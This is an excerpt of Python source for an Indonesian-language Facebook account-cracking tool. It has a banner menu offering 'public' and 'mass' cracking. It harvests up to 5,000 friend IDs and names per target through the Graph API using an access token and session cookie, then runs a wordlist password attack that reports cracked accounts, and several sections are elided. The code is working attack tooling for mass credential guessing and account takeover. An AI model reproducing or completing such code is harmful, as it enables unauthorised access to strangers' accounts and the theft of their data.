...
def menu(my_name,my_id):
	...
	banner()
	linex()
	print('%s[%s●%s] %sOnline'%(P,P,P,P));time.sleep(0.02)
	print('%s[●] IP  %s'%(P,str(sh['origin'])))
	print('%s[●] ID  %s'%(P,my_id))
	linex()
	print('%s[%s01%s] %sCRACK ID PUBLIK'%(P,P,P,P));time.sleep(0.02)
	print('%s[%s02%s] %sCRACK ID %sMASSAL'%(P,P,P,P,P));time.sleep(0.02)
	print('%s[%s03%s] %s\033[32mJOIN GRUP WHATSAPP%s'%(P,P,P,P,P));time.sleep(0.02)
	print('%s[%s04%s] %s\033[95mKONTAK ADMIN%s'%(P,P,P,P,P));time.sleep(0.02)
...
def dump_publik():
	try:
		...
		exit()
	linex()
	print(P+'['+P+'●'+P+'] ID NYA YG PUBLIK YA SAYANK')
	pil = input(P+'['+P+'●'+P+'] MASUKAN ID ● ')
	try:
		...
		print('# PILIH YANG BENER Bangsad')
		exit()
...
def multidump():
	...
	for mnh in range(nanya_keun):
		mnh +=1
		print()
		pil = input('[%s●%s] MASUKAN ID %s%s%s : '%(P,P,P,mnh,P))
		try:
			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
			for pi in koh2['friends']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
	...
	print()
	print(P+'['+P+'•'+P+'] Berhasil Mengumpukan: '+str(len(id)))
	setting()
...
# WORDLIST
def passwrd():
	ler = '# CRACK DIMULAI, TEKAN CTRL+Z TO STOP'
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}[HAFIZD-XD-OK] {idf} ID {pw}SANDI{N}')
